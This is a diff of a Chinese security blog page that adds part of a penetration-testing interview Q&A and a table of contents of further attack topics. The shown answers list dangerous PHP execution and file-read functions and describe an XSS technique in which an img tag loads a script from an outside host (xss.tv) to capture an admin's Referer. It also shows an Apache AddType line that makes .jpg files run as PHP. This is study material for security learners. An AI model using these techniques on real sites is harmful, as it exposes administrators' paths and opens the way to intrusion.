+<h5 id="十一：SQL注入防护方法？"><a href="#十一：SQL注入防护方法？" class="headerlink" title="十一：SQL注入防护方法？"></a>十一：SQL注入防护方法？</h5><p>  1、使用安全的API<br>  2、对输入的特殊字符进行Escape转义处理<br>  3、使用白名单来规范化输入验证方法<br>  4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>  5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。</p>
+<h5 id="十二，代码执行，文件读取，命令执行的函数都有哪些？"><a href="#十二，代码执行，文件读取，命令执行的函数都有哪些？" class="headerlink" title="十二，代码执行，文件读取，命令执行的函数都有哪些？"></a>十二，代码执行，文件读取，命令执行的函数都有哪些？</h5><p>  1，代码执行：eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function<br>  2，文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等<br>  3，命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
+<h5 id="十三，img标签除了onerror属性外，还有其他获取管理员路径的办法吗？"><a href="#十三，img标签除了onerror属性外，还有其他获取管理员路径的办法吗？" class="headerlink" title="十三，img标签除了onerror属性外，还有其他获取管理员路径的办法吗？"></a>十三，img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</h5><p>  src指定一个远程的脚本文件，获取referer</p>
+<h5 id="十四，img标签除了onerror属性外，并且src属性的后缀名，必须以-jpg结尾，怎么获取管理员路径。"><a href="#十四，img标签除了onerror属性外，并且src属性的后缀名，必须以-jpg结尾，怎么获取管理员路径。" class="headerlink" title="十四，img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。"></a>十四，img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</h5><p>  远程服务器修改apache配置文件，配置.jpg文件以php方式来解析<br>  AddType application/x-httpd-php .jpg<br>  &lt;img src=<a target="_blank" rel="noopener" href="http://xss.tv/1.jpg">http://xss.tv/1.jpg</a>&gt; 会以php方式来解析</p>
 
     
 
     
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Tools</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/11/16/Dirsaerch%E4%B8%AD%E6%96%87%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
+    <div class="page-reward">
+      <a href="javascript:void(0);" class="page-reward-btn tooltip-top" target="_self">
+        <div class="tooltip tooltip-east">
+          <span class="tooltip-item">
+            赏
+          </span>
+          <span class="tooltip-content">
+            <span class="tooltip-text">
+              <span class="tooltip-inner">
+                <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢打赏，一起努力~<i
+                    class="icon icon-quo-right"></i></p>
+                <div class="reward-box">
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/alipay.jpg">
+                    <span class="reward-type">支付宝</span>
+                  </div>
+                  
+                  
+                  <div class="reward-box-item">
+                    <img class="reward-img" src="/img/vxpay.jpg">
+                    <span class="reward-type">微信</span>
+                  </div>
+                  
+                </div>
+              </span>
+            </span>
+          </span>
         </div>
-        
-        
+      </a>
     </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Upload-labs" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/11/08/Upload-labs/" target="_blank">Upload-labs</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/11/08/Upload-labs/" class="archive-article-date">
-        <time datetime="2020-11-08T10:52:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-08</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h3 id="Upload-labs通关记录"><a href="#Upload-labs通关记录" class="headerlink" title="Upload-labs通关记录"></a>Upload-labs通关记录</h3><p>Pass01 - Pass21 全记录</p>
-    
-    <a class="article-more-a" href="/2020/11/08/Upload-labs/#more">more >></a>
-    
     
 
     
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Writeup</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/11/08/Upload-labs/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          Squidward
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="http://www.squidward.xyz/2021/05/10/渗透常见面试题/" title="渗透常见面试题.md" target="_blank">http://www.squidward.xyz/2021/05/10/渗透常见面试题/</a>
+        </li>
         
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
+        <li>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
         
-        
+      </ul>
     </div>
-</aside>
-
-
-
-
-  
-    <article id="post-BUUCTFwp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/10/31/BUUCTFwp/" target="_blank">BUUCTFwp</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/10/31/BUUCTFwp/" class="archive-article-date">
-        <time datetime="2020-10-31T01:33:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-31</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/">Web</a></h1><p>web题刷题writeup记录</p>
-<p>更新频率不定</p>
-    
-    <a class="article-more-a" href="/2020/10/31/BUUCTFwp/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Writeup</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/10/31/BUUCTFwp/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Flask学习笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/10/28/Flask%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank">Flask学习笔记</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/10/28/Flask%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-        <time datetime="2020-10-28T04:05:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-28</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h2><p>Flask 是一个微型的 Python 开发的 Web 框架，基于Werkzeug WSGI工具箱和 Jinja2 模板引擎。</p>
-    
-    <a class="article-more-a" href="/2020/10/28/Flask%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">语言</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/10/28/Flask%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-命令执行漏洞总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/10/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" target="_blank">命令执行漏洞总结</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/10/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="archive-article-date">
-        <time datetime="2020-10-28T03:15:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-28</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="命令执行漏洞利用及绕过方式总结"><a href="#命令执行漏洞利用及绕过方式总结" class="headerlink" title="命令执行漏洞利用及绕过方式总结"></a>命令执行漏洞利用及绕过方式总结</h2><p>将CTF中常见的命令执行漏洞的利用和绕过方式进行归纳总结</p>
-    
-    <a class="article-more-a" href="/2020/10/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#more">more >></a>
-    
-    
-
-    
-
     
 
   </div>
@@ -608,16 +404,76 @@
     
 
     
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/10/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">展开全文 >></a>
-    </p>
+
     
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://www.squidward.xyz/2021/05/10/%E6%B8%97%E9%80%8F%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
 
     
     <div class="clearfix"></div>
   </div>
   </div>
 </article>
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2021/05/10/nmap%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">nmap使用心得</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -632,271 +488,33 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Flag" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/10/28/Flag/" target="_blank">Flag</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/10/28/Flag/" class="archive-article-date">
-        <time datetime="2020-10-28T02:49:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-28</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>即兴记录自己的成长和一些想法。</p>
-    
-    <a class="article-more-a" href="/2020/10/28/Flag/#more">more >></a>
-    
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2020/10/28/Flag/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80-%E5%B8%B8%E8%A7%84%E9%9D%A2%E8%AF%95%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">一. 常规面试题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%8B%BF%E5%88%B0%E4%B8%80%E4%B8%AA%E5%BE%85%E6%A3%80%E6%B5%8B%E7%9A%84%E7%AB%99%EF%BC%8C%E4%BD%A0%E8%A7%89%E5%BE%97%E5%BA%94%E8%AF%A5%E5%85%88%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.拿到一个待检测的站，你觉得应该先做什么？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-mysql%E7%9A%84%E7%BD%91%E7%AB%99%E6%B3%A8%E5%85%A5%EF%BC%8C5-0%E4%BB%A5%E4%B8%8A%E5%92%8C5-0%E4%BB%A5%E4%B8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">1.0.2.</span> <span class="toc-text">2.mysql的网站注入，5.0以上和5.0以下有什么区别？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%9C%A8%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E6%94%B6%E9%9B%86%E7%9B%AE%E6%A0%87%E7%AB%99%E6%B3%A8%E5%86%8C%E4%BA%BA%E9%82%AE%E7%AE%B1%E5%AF%B9%E6%88%91%E4%BB%AC%E6%9C%89%E4%BB%80%E4%B9%88%E4%BB%B7%E5%80%BC%EF%BC%9F"><span class="toc-number">1.0.3.</span> <span class="toc-text">3.在渗透过程中，收集目标站注册人邮箱对我们有什么价值？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%88%A4%E6%96%AD%E5%87%BA%E7%BD%91%E7%AB%99%E7%9A%84CMS%E5%AF%B9%E6%B8%97%E9%80%8F%E6%9C%89%E4%BB%80%E4%B9%88%E6%84%8F%E4%B9%89%EF%BC%9F"><span class="toc-number">1.0.4.</span> <span class="toc-text">4.判断出网站的CMS对渗透有什么意义？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E4%B8%80%E4%B8%AA%E6%88%90%E7%86%9F%E5%B9%B6%E4%B8%94%E7%9B%B8%E5%AF%B9%E5%AE%89%E5%85%A8%E7%9A%84CMS%EF%BC%8C%E6%B8%97%E9%80%8F%E6%97%B6%E6%89%AB%E7%9B%AE%E5%BD%95%E7%9A%84%E6%84%8F%E4%B9%89%EF%BC%9F"><span class="toc-number">1.0.5.</span> <span class="toc-text">5.一个成熟并且相对安全的CMS，渗透时扫目录的意义？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8%E3%80%82"><span class="toc-number">1.0.6.</span> <span class="toc-text">6.常见的网站服务器容器。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#7-mysql%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E7%94%A8%E5%B7%A5%E5%85%B7%E5%AF%B9%E7%9B%AE%E6%A0%87%E7%AB%99%E7%9B%B4%E6%8E%A5%E5%86%99%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%8C%E9%9C%80%E8%A6%81%E5%93%AA%E4%BA%9B%E6%9D%A1%E4%BB%B6%EF%BC%9F"><span class="toc-number">1.0.7.</span> <span class="toc-text">7.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#8-%E7%9B%AE%E5%89%8D%E5%B7%B2%E7%9F%A5%E5%93%AA%E4%BA%9B%E7%89%88%E6%9C%AC%E7%9A%84%E5%AE%B9%E5%99%A8%E6%9C%89%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%85%B7%E4%BD%93%E4%B8%BE%E4%BE%8B%E3%80%82"><span class="toc-number">1.0.8.</span> <span class="toc-text">8.目前已知哪些版本的容器有解析漏洞，具体举例。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#9-%E5%A6%82%E4%BD%95%E6%89%8B%E5%B7%A5%E5%BF%AB%E9%80%9F%E5%88%A4%E6%96%AD%E7%9B%AE%E6%A0%87%E7%AB%99%E6%98%AFwindows%E8%BF%98%E6%98%AFlinux%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%9F"><span class="toc-number">1.0.9.</span> <span class="toc-text">9.如何手工快速判断目标站是windows还是linux服务器？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#10-%E4%B8%BA%E4%BD%95%E4%B8%80%E4%B8%AAmysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E7%AB%99%EF%BC%8C%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA80%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE%EF%BC%9F"><span class="toc-number">1.0.10.</span> <span class="toc-text">10.为何一个mysql数据库的站，只有一个80端口开放？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#11-3389%E6%97%A0%E6%B3%95%E8%BF%9E%E6%8E%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%83%85%E5%86%B5%E3%80%82"><span class="toc-number">1.0.11.</span> <span class="toc-text">11.3389无法连接的几种情况。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#12-%E5%A6%82%E4%BD%95%E7%AA%81%E7%A0%B4%E6%B3%A8%E5%85%A5%E6%97%B6%E5%AD%97%E7%AC%A6%E8%A2%AB%E8%BD%AC%E4%B9%89%EF%BC%9F"><span class="toc-number">1.0.12.</span> <span class="toc-text">12.如何突破注入时字符被转义？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#13-%E5%9C%A8%E6%9F%90%E5%90%8E%E5%8F%B0%E6%96%B0%E9%97%BB%E7%BC%96%E8%BE%91%E7%95%8C%E9%9D%A2%E7%9C%8B%E5%88%B0%E7%BC%96%E8%BE%91%E5%99%A8%EF%BC%8C%E5%BA%94%E8%AF%A5%E5%85%88%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.0.13.</span> <span class="toc-text">13.在某后台新闻编辑界面看到编辑器，应该先做什么？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#14-%E6%8B%BF%E5%88%B0%E4%B8%80%E4%B8%AAwebshell%E5%8F%91%E7%8E%B0%E7%BD%91%E7%AB%99%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%9C%89-htaccess%E6%96%87%E4%BB%B6%EF%BC%8C%E6%88%91%E4%BB%AC%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.0.14.</span> <span class="toc-text">14.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#15-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8F%AA%E8%83%BD%E6%9F%A5%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%EF%BC%9F"><span class="toc-number">1.0.15.</span> <span class="toc-text">15.注入漏洞只能查账号密码？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#16-%E5%AE%89%E5%85%A8%E7%8B%97%E4%BC%9A%E8%BF%BD%E8%B8%AA%E5%8F%98%E9%87%8F%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%8F%91%E7%8E%B0%E5%87%BA%E6%98%AF%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E5%90%97%EF%BC%9F"><span class="toc-number">1.0.16.</span> <span class="toc-text">16.安全狗会追踪变量，从而发现出是一句话木马吗？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#17-access-%E6%89%AB%E5%87%BA%E5%90%8E%E7%BC%80%E4%B8%BAasp%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6%EF%BC%8C%E8%AE%BF%E9%97%AE%E4%B9%B1%E7%A0%81%E3%80%82%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%88%B0%E6%9C%AC%E5%9C%B0%E5%88%A9%E7%94%A8%E3%80%82"><span class="toc-number">1.0.17.</span> <span class="toc-text">17.access 扫出后缀为asp的数据库文件，访问乱码。如何实现到本地利用。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#18-%E6%8F%90%E6%9D%83%E6%97%B6%E9%80%89%E6%8B%A9%E5%8F%AF%E8%AF%BB%E5%86%99%E7%9B%AE%E5%BD%95%EF%BC%8C%E4%B8%BA%E4%BD%95%E5%B0%BD%E9%87%8F%E4%B8%8D%E7%94%A8%E5%B8%A6%E7%A9%BA%E6%A0%BC%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%9F"><span class="toc-number">1.0.18.</span> <span class="toc-text">18.提权时选择可读写目录，为何尽量不用带空格的目录？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#19-%E6%9F%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9C%89%E7%AB%99%E7%82%B9A-B-%E4%B8%BA%E4%BD%95%E5%9C%A8A%E7%9A%84%E5%90%8E%E5%8F%B0%E6%B7%BB%E5%8A%A0test%E7%94%A8%E6%88%B7%EF%BC%8C%E8%AE%BF%E9%97%AEB%E7%9A%84%E5%90%8E%E5%8F%B0%E3%80%82%E5%8F%91%E7%8E%B0%E4%B9%9F%E6%B7%BB%E5%8A%A0%E4%B8%8A%E4%BA%86test%E7%94%A8%E6%88%B7%EF%BC%9F"><span class="toc-number">1.0.19.</span> <span class="toc-text">19.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#20-%E6%B3%A8%E5%85%A5%E6%97%B6%E5%8F%AF%E4%BB%A5%E4%B8%8D%E4%BD%BF%E7%94%A8and-%E6%88%96or-%E6%88%96xor%EF%BC%8C%E7%9B%B4%E6%8E%A5order-by-%E5%BC%80%E5%A7%8B%E6%B3%A8%E5%85%A5%E5%90%97%EF%BC%9F"><span class="toc-number">1.0.20.</span> <span class="toc-text">20.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#21-%E6%9F%90%E4%B8%AA%E9%98%B2%E6%B3%A8%E5%85%A5%E7%B3%BB%E7%BB%9F%EF%BC%8C%E5%9C%A8%E6%B3%A8%E5%85%A5%E6%97%B6%E4%BC%9A%E6%8F%90%E7%A4%BA%EF%BC%9A"><span class="toc-number">1.0.21.</span> <span class="toc-text">21:某个防注入系统，在注入时会提示：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#22-%E4%B8%8A%E4%BC%A0%E5%A4%A7%E9%A9%AC%E5%90%8E%E8%AE%BF%E9%97%AE%E4%B9%B1%E7%A0%81%E6%97%B6%EF%BC%8C%E6%9C%89%E5%93%AA%E4%BA%9B%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%EF%BC%9F"><span class="toc-number">1.0.22.</span> <span class="toc-text">22.上传大马后访问乱码时，有哪些解决办法？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#23-%E5%AE%A1%E6%9F%A5%E4%B8%8A%E4%BC%A0%E7%82%B9%E7%9A%84%E5%85%83%E7%B4%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%84%8F%E4%B9%89%EF%BC%9F"><span class="toc-number">1.0.23.</span> <span class="toc-text">23.审查上传点的元素有什么意义？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#24-%E7%9B%AE%E6%A0%87%E7%AB%99%E7%A6%81%E6%AD%A2%E6%B3%A8%E5%86%8C%E7%94%A8%E6%88%B7%EF%BC%8C%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E5%A4%84%E9%9A%8F%E4%BE%BF%E8%BE%93%E5%85%A5%E7%94%A8%E6%88%B7%E5%90%8D%E6%8F%90%E7%A4%BA%EF%BC%9A%E2%80%9C%E6%AD%A4%E7%94%A8%E6%88%B7%E4%B8%8D%E5%AD%98%E5%9C%A8%E2%80%9D%EF%BC%8C%E4%BD%A0%E8%A7%89%E5%BE%97%E8%BF%99%E9%87%8C%E6%80%8E%E6%A0%B7%E5%88%A9%E7%94%A8%EF%BC%9F"><span class="toc-number">1.0.24.</span> <span class="toc-text">24.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 